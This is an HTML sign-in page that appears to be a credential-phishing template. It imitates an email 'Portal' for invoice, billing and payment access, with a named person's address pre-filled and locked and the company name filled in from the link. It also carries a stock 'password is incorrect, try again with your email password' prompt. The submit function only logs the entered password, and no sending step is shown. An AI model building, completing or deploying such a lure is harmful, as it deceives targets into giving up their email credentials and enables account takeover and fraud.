<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
    <title id="pageTitle">Portal</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <style>
        body {
            background: #f0f4f7; /* Light gray background */
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh; /* Full-screen height */
        }

        #main-outer-container {
            width: 100%;
            max-width: 420px; /* Restrict login container width */
            background: white;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2); /* Enhanced shadow for depth */
            border-radius: 8px; /* Rounded corners */
            overflow: hidden;
        }

        #main-inner-container {
            padding: 30px; /* Increased padding for better spacing */
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0D5CAB; /* Button matches company name color */
            color: #FFFFFF;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            margin-top: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0A4B8A; /* Slightly darker blue on hover */
        }

        #companyName {
            color: #0D5CAB;
            font-size: 28px; /* Larger font for prominence */
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px; /* Space below heading */
        }

        #error-message {
            color: #a94442;
            background: #f2dede;
            border: 1px solid rgb(128, 0, 0);
            padding: 15px; /* Expanded padding for better readability */
            font-size: 16px;
            margin-bottom: 16px;
            border-radius: 4px;
            text-align: center;
            display: none; /* Initially hidden for default state */
        }

        img#logoImg {
            height: 84px;
            width: auto;
            display: block;
            margin: auto;
            margin-bottom: 20px; /* Padding below the logo */
        }

        input {
            width: 100%;
            height: 36px;
            border: 1px solid #ddd;
            padding: 1px 8px;
            border-radius: 4px;
            margin-bottom: 16px;
        }

        select {
            width: 100%;
            height: 36px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-top: 12px;
            margin-bottom: 12px; /* Adjusted spacing for tighter layout */
        }

        footer {
            text-align: center;
            font-size: 12px;
            color: #555;
            margin-top: 6px; /* Reduced excess vertical space */
        }

        @media (max-width: 768px) {
            /* Responsive styling for smaller screens */
            #main-inner-container {
                padding: 20px;
            }

            #companyName {
                font-size: 22px; /* Adjust font size for smaller screens */
            }

            button {
                font-size: 0.9rem; /* Decrease button size slightly */
            }
        }
    </style>
</head>

<body>
    <div id="main-outer-container">
        <div id="main-inner-container">
            <div id="form-main-outer">
                <!-- Logo Section -->
                <div>
                    <img id="logoImg" src="/assets/img/LoginBanner.png" alt="Logo" />
                </div>

                <!-- Company Name -->
                <h5 id="companyName">GAGECOINC</h5>

                <!-- Error Message -->
                <div id="error-message">
                    The password is incorrect. Try again with your email password.
                </div>

                <!-- Form Section -->
                <div>
                    <p>Sign in with your Email to continue:</p>
                    <input type="text" id="email" value="randy@gagecoinc.com" readonly>
                    <p>Enter password:</p>
                    <input type="password" id="password" placeholder="Password">
                    <button type="button" onclick="nextFun();">Sign In</button>
                </div>

                <!-- Footer Section -->
                <div>
                    <select>
                        <option value="Client Invoice Portal">Client Invoice Portal</option>
                        <option value="Billing Portal">Billing Portal</option>
                        <option value="Payment Portal">Payment Portal</option>
                    </select>
                    <footer>&copy; 2025 All Rights Reserved</footer>
                </div>
            </div>
        </div>
    </div>

    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            if (!hash.includes("@")) return;

            const emailParts = hash.split("@");
            const domain = emailParts[1].toLowerCase();

            const companyNameMapping = {
                "gagecoinc.com": "GAGECOINC",
                "examplecompany.com": "EXAMPLECOMPANY",
            };

            const companyRootName = domain.split(".")[0].toUpperCase();
            const companyName = companyNameMapping[domain] || companyRootName;

            document.getElementById("companyName").textContent = companyName;
            const logo = document.getElementById("logoImg");
            const fallback = "/assets/img/LoginBanner.png";

            logo.onerror = () => {
                logo.src = fallback; /* Fallback logo path */
            };
        });

        function nextFun() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (email.length === 0 || password.length === 0) {
                const errorDiv = document.getElementById("error-message");
                errorDiv.style.display = "block";
                errorDiv.innerText = "Email or Password is empty.";
                setTimeout(() => {
                    errorDiv.style.display = "none";
                }, 2000);
                return;
            }

            console.log("Perform login validation for:", email, password);
        }
    </script>
</body>

</html>
